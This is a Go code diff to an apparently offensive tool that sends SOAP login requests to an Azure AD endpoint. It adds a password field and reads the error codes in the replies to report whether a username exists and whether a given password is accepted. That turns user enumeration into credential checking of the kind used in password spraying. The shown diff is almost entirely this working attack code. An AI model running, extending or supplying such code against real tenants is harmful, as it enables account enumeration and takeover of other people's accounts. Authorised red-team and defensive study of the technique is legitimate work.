@@ -11,9 +11,10 @@ import (
 )
 
 type Target struct {
-	User   string
-	Domain string
-	Guid   string
+	User     string
+	Domain   string
+	Guid     string
+	Password string
 }
 
 func Query(t *Target) {
@@ -35,7 +36,7 @@ func Query(t *Target) {
 		  </u:Timestamp>
 		  <o:UsernameToken u:Id="uuid-ec4527b8-bbb0-4cbb-88cf-abe27fe60977">
 			<o:Username>` + t.User + ` </o:Username>
-			<o:Password>Pword</o:Password>
+			<o:Password>` + t.Password + `</o:Password>
 		  </o:UsernameToken>
 		</o:Security>
 	  </s:Header>
@@ -66,13 +67,18 @@ func Query(t *Target) {
 	}
 
 	data, _ := ioutil.ReadAll(res.Body)
-
 	res.Body.Close()
 
 	// If response contains AADSTS50034, user does not exist in AD environment
-	if strings.Contains(string(data), "AADSTS50034") {
+	if strings.Contains(string(data), "DesktopSsoToken") {
+		fmt.Println("[+] " + t.User + " Exists \n\r[+] Password Accepted\n\r[+] " + t.Password)
+	} else if strings.Contains(string(data), "AADSTS50034") {
 		fmt.Println("[-] User Does Not Exist")
+	} else if strings.Contains(string(data), "AADSTS50126 ") {
+		fmt.Println("[+] " + t.User + "exists")
+		fmt.Println("[-] Password Incorrect")
 	} else {
 		fmt.Println("[+] " + t.User + " exists")
 	}
+
 }
